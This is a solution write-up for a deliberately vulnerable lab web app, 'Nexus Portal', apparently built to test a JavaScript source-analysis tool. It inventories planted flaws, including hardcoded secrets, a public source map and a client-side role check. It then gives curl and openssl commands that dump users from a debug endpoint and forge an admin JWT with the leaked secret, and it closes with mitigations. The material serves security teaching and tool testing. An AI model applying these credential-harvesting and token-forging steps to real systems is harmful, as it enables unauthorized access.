# spa-lab — Solution

> **Purpose:** test case for JS source code analysis tooling (BrainTruder).
> Every finding is a deliberate planted artefact — no framework noise.

## Lab summary

"Nexus Portal" — a fictional corporate SPA (nginx + Express/Node backend) at
`http://localhost:8093`. The frontend serves four JS artefacts; the backend
exposes a REST API. Six independent findings, two attack paths to the flag.

---

## Findings inventory

| # | File | Finding | Severity |
|---|---|---|---|
| F1 | `/js/config.js` | Hardcoded Stripe secret key, internal API key, Sentry DSN | Critical |
| F2 | `/js/app.js.map` | Source map served publicly — reconstructs to reveal DB/Redis/AWS creds + JWT secret | Critical |
| F3 | `/js/app.js` | All API routes hardcoded including undocumented `/api/v1/debug/dump` and `/api/v1/admin/flag` | High |
| F4 | `/js/app.js` | JWT signing secret hardcoded: `nexus-jwt-hs256-pr0d-k3y-2024!` | Critical |
| F5 | `/js/app.js` | Client-side role check (`user.role === 'admin'`) — gating based on unverified JWT payload | Medium |
| F6 | `/js/app.js` | `console.log` of full JWT token and decoded payload on every login | Low |

---

## Attack path A — debug endpoint (no auth needed)

Discovered via hardcoded route in `app.js` (Finding F3):

```bash
curl http://localhost:8093/api/v1/debug/dump
```

Returns all users with plaintext passwords including admin (`Nexus@dm1n2024!`),
plus the JWT secret in the response body.

**🏁 Use admin creds to login and reach the flag:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8093/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Nexus@dm1n2024!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

curl http://localhost:8093/api/v1/admin/flag \
  -H "Authorization: Bearer $TOKEN"
```

---

## Attack path B — forge admin JWT via leaked secret

**Step 1 — find the secret** (any of three locations):
```bash
# From app.js directly
curl -s http://localhost:8093/js/app.js | grep _JWT_SECRET

# From source map (more realistic — scanner reconstructs sourcesContent)
curl -s http://localhost:8093/js/app.js.map | python3 -c "
import json,sys
for s in json.load(sys.stdin)['sourcesContent']:
    if 'JWT_SECRET' in s: print(s)
"
# -> export const JWT_SECRET = "nexus-jwt-hs256-pr0d-k3y-2024!";
```

**Step 2 — forge a signed admin JWT:**
```bash
HEADER=$(echo -n '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"id":1,"username":"admin","role":"admin","iat":1700000000,"exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
SECRET="nexus-jwt-hs256-pr0d-k3y-2024!"
SIG=$(echo -n "${HEADER}.${PAYLOAD}" | openssl dgst -sha256 -hmac "$SECRET" -binary | base64 | tr -d '=' | tr '+/' '-_')
FORGED="${HEADER}.${PAYLOAD}.${SIG}"
```

Or with jwt_tool:
```bash
python3 jwt_tool.py <any_valid_token> -T -S hs256 -p "nexus-jwt-hs256-pr0d-k3y-2024!"
```

**Step 3 — call admin flag endpoint:**
```bash
curl http://localhost:8093/api/v1/admin/flag \
  -H "Authorization: Bearer $FORGED"
```

**🏁 `FLAG{spa_js_source_analysis_jwt_secret_leaked}`**

---

## Full findings detail

### F1 — config.js hardcoded credentials
`GET /js/config.js` — no auth, served publicly.
- `STRIPE_SECRET_KEY: "sk_live_4eC39..."` — live Stripe secret key (should never be in browser JS)
- `INTERNAL_API_KEY: "ik-prod-7f3a2b1c..."` — server-to-server key exposed to browser
- `SENTRY_DSN` — leaks Sentry org slug and project ID

### F2 — source map (`app.js.map`)
`GET /js/app.js.map` — served by nginx. The `sourcesContent` array is the
unminified source, containing `secrets.js`:
```
JWT_SECRET, DB_PASSWORD, REDIS_PASSWORD, ADMIN_BOOTSTRAP_TOKEN, AWS_ACCESS_KEY, AWS_SECRET_KEY
```

### F3 — hardcoded routes
`ROUTES` object in `app.js` lists all endpoints including:
- `/api/v1/debug/dump` — unauthenticated data dump
- `/api/v1/admin/flag` — flag endpoint (auth required but locatable)

### F4 — JWT secret in bundle
`const _JWT_SECRET = "nexus-jwt-hs256-pr0d-k3y-2024!"` — directly in the JS bundle.
All tokens signed with this secret can be forged.

### F5 — client-side role check
Admin sections rendered purely based on `user.role === 'admin'` from decoded
JWT payload. Since the JWT is stored in localStorage and the payload is only
base64-encoded (not encrypted), a user can decode → modify role → re-encode the
payload and the UI renders the admin section. Backend still validates signature,
so this is a UI-only bypass — but combined with F4 it becomes full auth bypass.

### F6 — console.log token
Every login: `console.log("[Nexus] token:", data.token)` and payload decoded.
Any browser with DevTools open, or any XSS attacker with console access, gets
the token for free.

---

## Mitigations

| Finding | Fix |
|---|---|
| Hardcoded secrets in JS | Move ALL secrets to backend env vars — browser JS must never contain server-side keys |
| Source maps in prod | Disable source map generation in Vite/webpack for production builds (`sourcemap: false`) |
| JWT secret in bundle | JWT signing is a backend-only operation — secret never leaves the server |
| Client-side role check | Treat role from JWT as untrusted display-only data; enforce all authz server-side |
| Debug endpoint | Remove or gate behind env var + IP allowlist; add to pre-deploy checklist |
| console.log tokens | Strip debug logs in production builds via terser or a babel plugin |
